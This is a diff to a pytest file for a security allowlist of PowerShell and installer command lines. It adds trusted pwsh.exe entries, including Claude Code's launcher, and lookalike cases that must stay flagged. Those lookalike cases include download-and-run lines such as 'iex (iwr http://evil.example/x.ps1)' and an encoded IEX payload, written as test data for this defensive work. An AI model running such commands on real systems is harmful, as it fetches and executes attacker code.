@@ -13,6 +13,7 @@ EXAMPLE = Path(__file__).parent.parent / "allowlist.example.json"
 
 PS32 = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
 PS_WOW = r"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
+PWSH = r"C:\Program Files\WindowsApps\Microsoft.PowerShell_7.7.0.0_x64__8wekyb3d8bbwe\pwsh.exe"
 VSCODE_FLAGS = "-NoLogo -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command"
 PARSER_B64 = (
     "CgBmAHUAbgBjAHQAaQBvAG4AIABXAHIAaQB0AGUALQBSAGUAcwB1AGwAdAAoACQASgBzAG8AbgApACAAewAKACAA"
@@ -28,13 +29,22 @@ KNOWN_GOOD = [
     (PS32, f'"powershell.exe" {VSCODE_FLAGS} "Get-AppxPackage -Name \'Microsoft.VisualStudioCode\' '
            '| Select-Object -ExpandProperty PackageFullName"'),
     (PS_WOW, f'"{PS32}" {VSCODE_FLAGS} "Add-AppxPackage -Path '
-             r"'C:\Users\Evan\AppData\Local\Programs\Microsoft VS Code\2d0b7506a3\appx\code_x64.appx' "
-             r"-ExternalLocation 'C:\Users\Evan\AppData\Local\Programs\Microsoft VS Code\2d0b7506a3\appx'" '"'),
+             r"'C:\Users\<user>\AppData\Local\Programs\Microsoft VS Code\2d0b7506a3\appx\code_x64.appx' "
+             r"-ExternalLocation 'C:\Users\<user>\AppData\Local\Programs\Microsoft VS Code\2d0b7506a3\appx'" '"'),
     (PS_WOW, f'"{PS32}" {VSCODE_FLAGS} "Remove-AppxPackage -Package '
              "'Microsoft.VisualStudioCode_1.0.141.1_neutral__8wekyb3d8bbwe'\""),
     (PS_WOW, f'"{PS32}" {VSCODE_FLAGS} "Get-CimInstance Win32_Process -Filter ""Name = \'dllhost.exe\'"" '
              "| Where-Object { $_.CommandLine -like '*/Processid:1C6DF0C0-192A-4451-BE36-6A59A86A692E*' } "
              '| ForEach-Object { try { Stop-Process -Id $_.ProcessId -Force -ErrorAction Stop } catch {} }"'),
+    # Newer VS Code updater: backslash-escaped quotes, no "/Processid:" prefix.
+    (PS_WOW, f'"{PS32}" {VSCODE_FLAGS} "Get-CimInstance Win32_Process -Filter \\"Name = \'dllhost.exe\'\\" '
+             "| Where-Object { $_.CommandLine -like '*1C6DF0C0-192A-4451-BE36-6A59A86A692E*' } "
+             '| ForEach-Object { try { Stop-Process -Id $_.ProcessId -Force -ErrorAction Stop } catch {} }"'),
+    # Claude Code after switching its shell to PowerShell 7 (Store install).
+    (PWSH, f'"{PWSH}"  -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command '
+           '"$__claudeCodeScript = $env:CLAUDE_CODE_SHELL_LAUNCHER_SCRIPT; '
+           '$env:CLAUDE_CODE_SHELL_LAUNCHER_SCRIPT = $null; Invoke-Expression -Command $__claudeCodeScript" '),
+    (PWSH, f'"{PWSH}" -NoProfile -NonInteractive -NoLogo -EncodedCommand {PARSER_B64}'),
     (PS32, '"powershell.exe" -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File '
            r'"C:\Program Files\WindowsApps\AppUp.IntelArcSoftware_26.36.2702.0_x64__8j3eq9eme6ctt\VFS'
            r'\ProgramFilesX64\Intel\Intel Graphics Software\SetupEventChannels.ps1"'),
@@ -42,8 +52,8 @@ KNOWN_GOOD = [
      r'schtasks.exe /Create /tn "Microsoft\Office\Office Feature Updates Logon" /XML '
      r'"C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}'
      r'\Microsoft_Office_Office Feature Updates Logon.xml"'),
-    (r"C:\Users\Evan\AppData\Local\Temp\vscode-stable-user-x64\CodeSetup-stable-e646868227c3e3a9e3f24277c8c7220be42c0be7.exe", ""),
-    (r"C:\Users\Evan\AppData\Local\Temp\is-B2DH1.tmp\CodeSetup-stable-e646868227c3e3a9e3f24277c8c7220be42c0be7.tmp", ""),
+    (r"C:\Users\<user>\AppData\Local\Temp\vscode-stable-user-x64\CodeSetup-stable-e646868227c3e3a9e3f24277c8c7220be42c0be7.exe", ""),
+    (r"C:\Users\<user>\AppData\Local\Temp\is-B2DH1.tmp\CodeSetup-stable-e646868227c3e3a9e3f24277c8c7220be42c0be7.tmp", ""),
 ]
 
 
@@ -75,12 +85,16 @@ def test_example_allowlist_suppresses_known_good(image, command_line):
 @pytest.mark.parametrize("image,command_line", [
     # Known-good command with something appended: full match must reject it.
     (PS32, KNOWN_GOOD[0][1] + "; iex (iwr http://evil.example/x.ps1)"),
+    # Same, via pwsh.exe.
+    (PWSH, f'"{PWSH}"  -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "iex (iwr http://evil.example/x.ps1)"'),
+    # pwsh.exe from a user-writable path must not inherit the Store path's trust.
+    (PWSH, r'"C:\Users\Public\pwsh.exe" -NoProfile -NonInteractive -NoLogo -EncodedCommand ' + PARSER_B64),
     # Same flags, different encoded payload.
     (PS32, f"{PS32} -NoProfile -NonInteractive -NoLogo -EncodedCommand SQBFAFgAIAAoAGkAdwByACkA"),
     # A different -Command behind the VS Code updater's flags.
     (PS32, f'"powershell.exe" {VSCODE_FLAGS} "Invoke-WebRequest http://evil.example"'),
     # Temp executable that only resembles the VS Code setup name.
-    (r"C:\Users\Evan\AppData\Local\Temp\CodeSetup-stable-evil.exe", ""),
+    (r"C:\Users\<user>\AppData\Local\Temp\CodeSetup-stable-evil.exe", ""),
 ])
 def test_example_allowlist_keeps_lookalikes(image, command_line):
     allowlist = load_allowlist(EXAMPLE)
